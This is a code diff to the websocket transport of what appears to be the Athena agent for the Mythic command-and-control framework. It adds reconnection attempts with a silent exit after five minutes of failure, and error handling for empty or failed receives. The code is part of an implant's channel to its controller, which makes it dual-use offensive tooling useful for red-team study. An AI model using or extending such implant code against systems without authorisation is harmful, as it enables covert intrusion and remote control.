@@ -46,6 +46,7 @@ namespace Athena.Config
         public ClientWebSocket ws { get; set; }
         public PSKCrypto crypt { get; set; }
         public bool encrypted { get; set; }
+        public int connectAttempts { get; set; }
 
         public Websocket(string uuid)
         {
@@ -69,14 +70,22 @@ namespace Athena.Config
 
         public bool Connect(string url)
         {
+            this.connectAttempts = 0;
             try
             {
                 ws = new ClientWebSocket();
                 ws.ConnectAsync(new Uri(url), CancellationToken.None);
+                
                 while (ws.State != WebSocketState.Open)
                 {
+                    if (this.connectAttempts == 300)
+                    {
+                        //Couldn't connect for 5m, probably not going to connect if we got to this point.
+                        Environment.Exit(0);
+                    }
+                    Thread.Sleep(1000);
+                    this.connectAttempts++;
                 }
-
                 return true;
             }
             catch
@@ -98,16 +107,24 @@ namespace Athena.Config
                 {
                     json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                 }
+
                 WebSocketMessage m = new WebSocketMessage()
                 {
                     Client = true,
                     Data = json,
                     Tag = ""
                 };
+
                 string message = JsonConvert.SerializeObject(m);
                 byte[] msg = Encoding.UTF8.GetBytes(message);
                 await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
                 message = await Receive(ws);
+
+                if (String.IsNullOrEmpty(message))
+                {
+                    return "";
+                }
+
                 m = JsonConvert.DeserializeObject<WebSocketMessage>(message);
 
                 if (this.encrypted)
@@ -126,27 +143,35 @@ namespace Athena.Config
         }
         static async Task<string> Receive(ClientWebSocket socket)
         {
-            var buffer = new ArraySegment<byte>(new byte[2048]);
-            do
-            {
-                WebSocketReceiveResult result;
-                using (var ms = new MemoryStream())
+            try{
+                var buffer = new ArraySegment<byte>(new byte[2048]);
+                do
                 {
-                    do
+                    WebSocketReceiveResult result;
+                    using (var ms = new MemoryStream())
                     {
-                        result = await socket.ReceiveAsync(buffer, CancellationToken.None);
-                        ms.Write(buffer.Array, buffer.Offset, result.Count);
-                    } while (!result.EndOfMessage);
+                        do
+                        {
+                            result = await socket.ReceiveAsync(buffer, CancellationToken.None);
+                            ms.Write(buffer.Array, buffer.Offset, result.Count);
+                        } while (!result.EndOfMessage);
 
-                    if (result.MessageType == WebSocketMessageType.Close)
-                        break;
+                        if (result.MessageType == WebSocketMessageType.Close)
+                            break;
 
-                    ms.Seek(0, SeekOrigin.Begin);
-                    using (var reader = new StreamReader(ms, Encoding.UTF8))
-                        return (await reader.ReadToEndAsync());
-                }
-            } while (true);
-            return "";
+                        ms.Seek(0, SeekOrigin.Begin);
+                        using (var reader = new StreamReader(ms, Encoding.UTF8))
+                            return (await reader.ReadToEndAsync());
+                    }
+
+                } while (true);
+
+                return "";
+            }
+            catch
+            {
+                return "";
+            }
         }
         private class WebSocketMessage
         {
